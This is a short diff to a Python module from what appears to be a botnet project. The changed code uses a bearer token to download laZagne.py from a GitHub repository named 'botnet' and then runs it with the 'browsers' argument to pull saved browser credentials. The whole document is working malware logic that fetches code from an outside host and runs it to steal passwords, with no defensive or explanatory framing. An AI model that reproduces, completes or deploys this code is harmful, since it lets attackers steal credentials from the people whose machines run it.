@@ -2,17 +2,14 @@ import subprocess
 import requests
 import base64
 
-urlb = "https://api.github.com/repos/Pol-Ruiz/botnet/edit/main/laZagne.py"
-
-
-def downloadFile(urlb,token):
+def downloadFile(urlb, token):
     print('[!] Descargando ' + urlb)
     sha = None
     content = None
     headers = {
         'Authorization': 'Bearer ' + token
     }
-    res = requests.get(url).json()
+    res = requests.get(urlb, headers=headers).json()
     if 'sha' in res and 'content' in res:
         sha = res['sha']
         base64_bytes = base64.b64decode(res['content'])
@@ -24,8 +21,9 @@ def downloadFile(urlb,token):
     return sha, content
 
 def run(token):
+    urlb = "https://api.github.com/repos/Pol-Ruiz/botnet/edit/main/laZagne.py"
     # Descargar el archivo
-    downloadFile(urlb,token)
+    downloadFile(urlb, token)
     
     # Ejecutar el archivo con el argumento "all"
     output = subprocess.run(["python3", 'laZagne.py', "browsers"], check=True)
